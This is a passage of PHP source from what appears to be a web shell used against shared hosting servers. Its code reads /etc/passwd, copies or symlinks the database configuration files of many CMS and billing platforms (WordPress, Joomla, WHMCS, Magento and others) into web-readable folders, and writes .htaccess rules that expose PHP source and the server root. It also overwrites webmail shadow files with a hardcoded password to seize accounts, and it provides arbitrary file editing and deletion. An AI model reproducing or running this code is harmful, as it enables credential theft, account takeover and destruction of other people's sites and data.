exe("ln -s ".$user."/httpdocs/application/config/database.php brudul_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("brudul_symconfig", 0777);
@symlink("/","brudul_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("brudul_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("brudul_sym404", 0777);
@symlink("/","brudul_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=* 
AddIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' ^^DIRECTORY^^
DefaultIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*brudul_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("brudul_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
            mkdir("brudul_configgrab", 0777);
            $isi_htc = "Options all\nRequire None\nSatisfy Any";
            $htc = fopen("brudul_configgrab/.htaccess","w");
            fwrite($htc, $isi_htc); 
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_brudul) {
$grab_config = array(
"/home/$user_brudul/.accesshash" => "WHM-accesshash",
"/home/$user_brudul/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_brudul/public_html/forum/config.php" => "phpBB",
"/home/$user_brudul/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_brudul/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_brudul/public_html/app/etc/local.xml" => "Magento",
"/home/$user_brudul/public_html/admin/config.php" => "OpenCart",
"/home/$user_brudul/public_html/application/config/database.php" => "Ellislab",
"/home/$user_brudul/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/inc/config.php" => "MyBB",
"/home/$user_brudul/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/inc/conf_global.php" => "IPB",
"/home/$user_brudul/public_html/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/blog/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/submitticket.php" => "^WHMCS",
"/home/$user_brudul/public_html/cms/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/beta/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/portal/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/site/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/main/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/home/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/demo/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/test/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/v1/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/v2/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/new/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
  if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("brudul_configgrab/$user_brudul-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"brudul_Symconfig/".$user_brudul."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"brudul_sym404/".$user_brudul."-".$nama_config.".txt");
if($sym404){
  @mkdir("brudul_sym404/".$user_brudul."-".$nama_config.".txt404", 0777);
  $htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
HeaderName Brudul.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("brudul_sym404/".$user_brudul."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"brudul_sym404/".$user_brudul."-".$nama_config.".txt404/Brudul.txt");

  }

}

                    }     
    }  if($_POST['config'] == 'grab') {
            echo "<center><a href='?dir=$dir/brudul_configgrab'><font color=lime>Done</font></a></center>";
    }
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"brudul_sym404/root/\">SymlinkNya</a>
<br><a href=\"brudul_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"brudul_symconfig/root/\">Symlinknya</a>
<br><a href=\"brudul_symconfig/\">Configurations</a></center>";
      }if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"brudul_symvhost/root/\">Root Server</a>
<br><a href=\"brudul_symvhost/\">Configurations</a></center>";
      }
    
    
    }else{
        echo "<form method=\"post\" action=\"\"><center>
    </center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
    <option value=\"404\">Config 404</option>
    <option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
echo "<li> <a href='?dir=$dir&saf=config'>CONFIG2</a> </li>";   
}
}
elseif($_GET['saf'] == 'smtp') {
echo"<form action='' method='post'>
<input type='submit'value='COBA GANTI PASS' name='asu'/>";  
if(isset($_POST['asu'])){    
function smtp() { 
    $usr=get_current_user();
    $pass="cintaku1337";
    $pwd=crypt($pass,'$6$roottn$');
    $maindir="/home/".$usr."/etc/";
    chdir($maindir);
    $dir=scandir($maindir);
    foreach($dir as $dirs) {
      if($dirs!="." && $dirs!="..") {
        chdir($dirs);
        if(is_readable(shadow)) {
          link("shadow","shadow.bak3x");
          $get=file_get_contents("shadow");
          $email=explode(":",$get);
          $mailname=$email[0];
          unlink("shadow");
          $file=fopen("shadow","a");
          fwrite($file,$mailname.":".$pwd.":16249:::::"."\r\nl");
          fclose($file);
          echo"<pre>WEBMAIL:<font color='lime'>".$mailname."@".$dirs."</font>[PASS]<font color='lime'>"."<br /></pre></font>";
          chdir("..");
        }
      }
    }
}
smtp();
      }

            }
 elseif($_GET['act'] == 'newfile') {
  if($_POST['new_save_file']) {
    $newfile = htmlspecialchars($_POST['newfile']);
    $fopen = fopen($newfile, "a+");
    if($fopen) {
      $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  }
  echo $act;
  echo "<form method='post'>
  Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
  <input type='submit' name='new_save_file' value='Submit'>
  </form>";
} elseif($_GET['act'] == 'newfolder') {
  if($_POST['new_save_folder']) {
    $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
    if(!mkdir($new_folder)) {
      $act = "<font color=red>permission denied</font>";
    } else {
      $act = "<script>window.location='?dir=".$dir."';</script>";
    }
  }
  echo $act;
  echo "<form method='post'>
  Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
  <input type='submit' name='new_save_folder' value='Submit'>
  </form>";
} elseif($_GET['act'] == 'rename_dir') {
  if($_POST['dir_rename']) {
    $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
    if($dir_rename) {
      $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  echo "".$act."<br>";
  }
  echo "<form method='post'>
  <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
  <input type='submit' name='dir_rename' value='rename'>
  </form>";
} elseif($_GET['act'] == 'delete_dir') {
  function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }
        return rmdir($path);
    }
    else if (is_file($path) === true)
    {
        return unlink($path);
    }
    return false;
}
  $delete_dir = Delete($dir);
  if($delete_dir) {
    $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
  } else {
    $act = "<font color=red>could not remove ".basename($dir)."</font>";
  }
  echo $act;
} elseif($_GET['act'] == 'view') {
  echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
  echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
  if($_POST['save']) {
    $save = file_put_contents($_GET['file'], $_POST['src']);
    if($save) {
      $act = "<font color=lime>Saved!</font>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  echo "".$act."<br>";
  }
  echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
  echo "<form method='post'>
  <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
  <input type='submit' value='Save' name='save' style='width: 500px;'>
  </form>";
} elseif($_GET['act'] == 'rename') {
  if($_POST['do_rename']) {
    $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
    if($rename) {
      $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
      $act = "<font color=red>permission denied</font>";
    }
  echo "".$act."<br>";
  }
  echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
  echo "<form method='post'>
  <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
  <input type='submit' name='do_rename' value='rename'>
  </form>";
} elseif($_GET['act'] == 'delete') {
  $delete = unlink($_GET['file']);
  if($delete) {
    $act = "<script>window.location='?dir=".$dir."';</script>";
  } else {
    $act = "<font color=red>permission denied</font>";
  }
  echo $act;
}else {
  if(is_dir($dir) == true) {
  if($_GET['saf'] == 'file') {
    echo '<table width="90%" class="table_home"border="1" cellpadding="3"cellspacing="1" align="center">
    <tr>
    <th class="th_home"><center>Name</center></th>
    <th class="th_home"><center>Type</center></th>
    <th class="th_home"><center>Size</center></th>
    <th class="th_home"><center>Last Modified</center></th>
    <th class="th_home"><center>Permission</center></th>
    <th class="th_home"><center>Action</center></th>
    </tr>';
    $scandir = scandir($dir);
    foreach($scandir as $dirx) {
      $dtype = filetype("$dir/$dirx");
      $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
      if(!is_dir("$dir/$dirx")) continue;
      if($dirx === '..') {
        $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
      } elseif($dirx === '.') {
        $href = "<a href='?dir=$dir'>$dirx</a>";
      } else {
        $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
      }
      if($dirx === '.' || $dirx === '..') {
        $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
        } else {
        $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
      }
      echo "<tr>";
      echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
      echo "<td class='td_home'><center>$dtype</center></td>";
      echo "<td class='td_home'><center>-</center></th>";
      echo "<td class='td_home'><center>$dtime</center></td>";
      echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
      echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
    }
    echo "</tr>";
    foreach($scandir as $file) {
      $ftype = filetype("$dir/$file");
      $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
      $size = filesize("$dir/$file")/1024;
      $size = round($size,3);
      if($size > 1024) {
        $size = round($size/1024,2). 'MB';
      } else {
        $size = $size. 'KB';
      }
      if(!is_file("$dir/$file")) continue;
      echo "<tr>";
      echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'><font color='white'>$file</a></td></font>";
      echo "<td class='td_home'><center>$ftype</center></td>";
      echo "<td class='td_home'><center>$size</center></td>";
      echo "<td class='td_home'><center>$ftime</center></td>";
      echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
